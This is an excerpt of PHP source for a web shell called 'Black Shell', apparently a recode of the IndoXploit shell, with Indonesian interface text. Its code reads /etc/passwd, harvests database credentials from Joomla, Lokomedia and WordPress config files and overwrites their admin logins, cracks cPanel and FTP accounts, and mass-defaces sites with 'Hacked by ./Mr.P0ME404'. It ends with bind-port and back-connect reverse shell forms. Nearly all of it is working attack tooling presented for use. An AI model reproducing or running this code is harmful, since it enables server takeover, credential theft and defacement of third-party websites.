...
$auth_pass = "4f4adcbf8c6f66dcfc8a3282ac2bf10a"; // default: 404
$color = "#00ff00";
...
<head>
<title>Black Shell</title>
<meta name='author' content='Black Shell'>
<meta charset="UTF-8">
<style type='text/css'>
...
<?php
###############################################################################
// Shell by IndoXploit Recode By ./Mr.P0ME404
...
function bing($dork) {
	...
	$lll = array();
	while($npage <= $npages) {
	    $x = getsource("https://www.google.co.id/webhp?g=".$dork."&start=0".$npage);
	    if($x) {
...
if($_GET['logout'] == true) {
	...
	if(preg_match("/vhosts|vhost/", $dir)) {
		...
		$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Tidak Bisa Membaca /etc/passwd</font></pre>");
	...
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "Username dan Password harus lebih 6 Digit";
		} else {
			...
			foreach($scan_conf as $file_conf) {
				...
				if(preg_match("/JConfig|joomla/",$config)) {
					...
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>Gagal, Tidak bisa mengambil nama Domainnya</font><br>";
					} else {
					...
					if(!$update OR !$conn OR !$db) {
						...
						echo "Status => <font color=lime>Berhasil edit, Silahkan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
					...
					if($target == '') {
						$url_target = "Login => <font color=red>Gagal, Tidak bisa mengambil nama Domainnya</font><br>";
					} else {
					...
					if($target == '') {
						...
						$url_target = "Login => <font color=red>Gagal, Tidak bisa mengambil nama Domainnya</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>Gagal, Tidak bisa mengambil nama Domainnya</font><br>";
						} else {
							...
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								...
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>Admin Login Tidak Ketemu</font> ]<br>";
							}
						}
					} else {
						...
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							...
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>Admin Login Tidak Ketemu</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('Gagal, Tidak bisa mengambil nama Domainnya', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
	...
	if($_POST['crack']) {
					...
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
						...
						if($ucp == '' || $pcp == '') {
							...
							if(function_exists('posix_getpwuid')) {
								...
								if($domain_cp == '') {
									$dom =  "<font color=red>Gagal, Tidak bisa mengambil nama Domainnya</font>";
								} else {
								...
								$dom = "<font color=red>Functions di non-aktifkan oleh system</font>";
							}
		...
		if($i == 0) {
			...
			echo "<br>Sukses Mengambil ".$i." Cpanel by <font color=lime>Black Shell</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['crack']) {
							...
							if((!$ftp_login) || (!$ftp_conn)) {
								...
								if($deface) {
									...
									if(function_exists('posix_getpwuid')) {
										$domain_cp = file_get_contents("/etc/named.conf");	
										if($domain_cp == '') {
											echo "[+] <font color=red>Gagal, Tidak bisa mengambil nama Domainnya</font><br><br>";
										} else {
											preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
											foreach($domains_cp[1] as $dj) {
												$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
		...
		if($i == 0) {
			...
			echo "<br>Sukses Deface ".$i." Cpanel by <font color=lime>Black Shell</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['hajar']) {
		...
		foreach($scan_conf as $file_conf) {
			...
			if(preg_match("/WordPress/", $config)) {
				...
				if($target == '') {
					echo "URL: <font color=red>Gagal, Tidak bisa mengambil nama Domainnya</font> -> ";
				} else {
				...
				if(!$update OR !$conn OR !$db) {
					...
					echo "<font color=lime>Berhasil di ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by ./Mr.P0ME404' placeholder='New Title'><br><br>
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by ./Mr.P0ME404' required><br>
	...
	if($_POST['auto_deface_wp']) {
		...
		foreach($link as $dir_config) {
			...
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>Gagal, Tidak bisa mengambil nama Domainnya</font><br>";
			} else {
				echo "[+] $target <br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
	...
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='223'>
	<input type='submit' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='223'>
